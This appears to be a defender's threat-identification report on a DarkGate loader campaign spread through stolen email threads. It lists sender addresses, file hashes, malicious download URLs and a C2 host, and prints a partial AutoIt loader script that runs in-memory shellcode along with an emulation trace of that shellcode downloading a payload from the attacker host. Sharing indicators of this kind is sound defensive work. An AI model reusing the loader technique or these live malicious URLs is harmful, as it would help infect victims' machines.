THREAT IDENTIFICATION:  DARKGATE LOADER

SUBJECTS OBSERVED
All subjects were from previously stolen email threads.

SENDERS OBSERVED
afritsch@alinoto.com
am7x2@kacgun.com
dzulauf@12x12-bookstore.com
ebogan@vipmarriagemedia.com
ely1o7@epiloguesystems.com
emkrtya@onlinegroupbd.com
eugene.chan@manicon.com
geepnr@quartzojasmim.com
hrnahaocjesltm.en@kash-v.com
info@algotekstil.com
infosales@kabaz.com
jmeneses@unydos.com
llabadie@neverlatecleaning.com
ncff.rildaorde@xploreservice.com
si.cyaswaan@zionemart.com
temard@gcsmiami.com
tf.klneeoaoem@fitlifevet.com
vzemlak@faguscontent.com
wvreakl@btop-tech.com

PDF FILE HASHES
1bb0d6410b8e3b9a6c48b9556e954aee
1ce9c28c75d7cfe28f3296e6c4c81bb4
1feda574e4345a447efd0990298bb7b2
3bbfa9789b803850926a25c560e27a70
9937e645b25ca3a99f2ad85e0398cfcd
d30456afdff93fe362b6317a32079196
f00e65541eb90dd0fc70ef5064f6dc48
f582da8fcd0ce80630ebe8026a8bcb81
(All files that I saw were named: "[A-Za-z]{1,2}\.pdf" )

ZIP FILE REDIRECT URLS
https://ittrainingbd.com/pro/?zxEiGRcJFDMRoicmeAfEDLTLlVEhPePRwiDWaEmrRoVpeohusKLeQvcUrDAtmlNhBOjFWtBr
https://homemadetohome.com/ter/?AiQsxvyhdpDTOXpyXjTjqKDwZBHcUoxvJtZQMfMPGRZoJDHONQesjDbyMBpeFIFrYVgEjHKniQMqJbsQ
https://alriyada.edu.sa/meq/?NZlkiomiOBvyFOGhhsnZpLpfXvFBsqdhBiiPuSybICfPCzTElCcUPyDpUfFCSlYmSiHuwAfzNkmryyaVnrVxnHvzg
https://gentzhull.co.uk/cln/?CUyRhSHDAbxwSHCsMBGmfmipLQga
https://josemiguelescribano.com/uea/?qOmokqHCjbl
https://mhimedicalbilling.com/eusa/?iTjoEsjkngtHscTkzOmCiBNGfhRnwSMzaaay

ZIP FILE DOWNLOAD URLS
https://ittrainingbd.com/pro/?zxEiGRcJFDMRoicmeAfEDLTLlVEhPePRwiDWaEmrRoVpeohusKLeQvcUrDAtmlNhBOjFWtBr
https://homemadetohome.com/ter/?AiQsxvyhdpDTOXpyXjTjqKDwZBHcUoxvJtZQMfMPGRZoJDHONQesjDbyMBpeFIFrYVgEjHKniQMqJbsQ
https://alriyada.edu.sa/meq/?NZlkiomiOBvyFOGhhsnZpLpfXvFBsqdhBiiPuSybICfPCzTElCcUPyDpUfFCSlYmSiHuwAfzNkmryyaVnrVxnHvzg
https://gentzhull.co.uk/cln/?CUyRhSHDAbxwSHCsMBGmfmipLQga
https://josemiguelescribano.com/uea/?qOmokqHCjbl
https://mhimedicalbilling.com/eusa/?iTjoEsjkngtHscTkzOmCiBNGfhRnwSMzaaay

ZIP FILE DOWNLOAD DOMAINS
ittrainingbd.com
homemadetohome.com
alriyada.edu.sa
gentzhull.co.uk
josemiguelescribano.com
mhimedicalbilling.com

ZIP FILE HASHES
115930aa45778dfca71b39efdc6f66a1
5c2143dbf320fd30a4547f822d028c12
6deab79c1b18f48aea22eeac17f52b1c
b258b45a8ec299c18166123f5b927cb8
c7c11f951f8459db590e77bc75c27861
(All files that I saw were named: "[A-Za-z]{1,4}\.zip" )

MSI FILE HASHES
2b1fdee02aec0b42603d55416da62234
5098e8cdd54b1856fb927576b47433be
6feb6b306c1be1d23340e3d9d800b432
deb30961cc91d2924f50403a9a8c6f0c
e4538a585abf07b8c86b16a8b22de906
(All files that I saw were named: "Report-[0-9]{1,2}\.msi" )

AUTOIT EXECUTABLE DOWNLOAD URL
http://eugelens.com:2351/

AUTOIT EXECUTABLE FILE HASH
%5c
c56b5f0201a3b3de53e561fe76912bfd

AUTOIT SCRIPT DOWNLOAD URL
http://eugelens.com:2351/ipmyfu

AUTOIT SCRIPT FILE HASH
ipmyfu
ed8e8cde348ef96055e855d571a51f7e

AUTOIT SCRIPT CONTENTS
#NoTrayIcon
If FileExists(@TempDir) Then
	$lvfcpcip = "90E9B9030000004771"
	.
	.
	(several lines like this that are concatenated into a large blob)
	.
	.
	$lvfcpcip &= "645A5879"
	$sfoohg = DllStructCreate("byte[" & 5302 & "]")
	If NOT FileExists("C:\Program Files (x86)\Sophos") Then
		DllCall("kernel32.dll", "BOOL", "VirtualProtect", "ptr", DllStructGetPtr($sfoohg), "int", 5302, "dword", 64, "dword*", NULL )
	EndIf
	DllStructSetData($sfoohg, 1, BinaryToString("0x" & $lvfcpcip))
	DllCall("user32.dll", "int", "EnumWindows", "ptr", DllStructGetPtr($sfoohg), "lparam", 0)
EndIf

INITIAL SHELLCODE ANALYSIS FROM THE AUTOIT SCRIPT BLOB
Loaded 296c bytes from file shellcode.txt
Detected straight hex encoding input format converting...
Initialization Complete..
Max Steps: 4000000
Using base offset: 0x401000

401ab7  GetProcAddress(CreateFileA)
401aca  GetProcAddress(VirtualAlloc)
401add  GetProcAddress(CloseHandle)
401af0  GetProcAddress(ReadFile)
401b03  GetProcAddress(GetFileAttributesA)
401b16  GetProcAddress(SetFilePointer)
401b25  GetProcAddress(LoadLibraryA)
401b38  GetProcAddress(CreateDirectoryA)
401b4b  GetFileAttributesA(C:\temp)
401b71  CreateDirectoryA(C:\temp)
401b7e  GetFileAttributesA(c:\temp\zqgfgn)
401ba5  LoadLibraryA(urlmon.dll)
401ba8  GetProcAddress(URLDownloadToFileA)
401bc8  URLDownloadToFileA(http://eugelens.com:2351/zqgfgn, c:\temp\zqgfgn)
401bdc  VirtualAlloc(base=0 , sz=6ddd0) = 600000
        Allocation 8 < 1024 adjusting...
401bf3  VirtualAlloc(base=0 , sz=400) = 66edd0
401c12  CreateFileA(c:\temp\zqgfgn) = 4
401c1d  SetFilePointer(hFile=4, dist=0, 0, FILE_BEGIN) = 0
401c33  ReadFile(hFile=4, buf=66edd0, numBytes=8) = 0
401c3c  SetFilePointer(hFile=4, dist=8, 0, FILE_BEGIN) = 0
401c58  ReadFile(hFile=4, buf=600000, numBytes=6ddd0) = 0
401c5f  CloseHandle(4)

ADDITIONAL DOWNLOAD URL
http://eugelens.com:2351/zqgfgn
(This file is also copied to C:\Temp)

ADDITIONAL DOWNLOADED FILE HASH
zqgfgn
3750edd59d78a01969aa3d2d384e427d

DARKGATE C2s
eugelens.com:2351
(POST traffic)







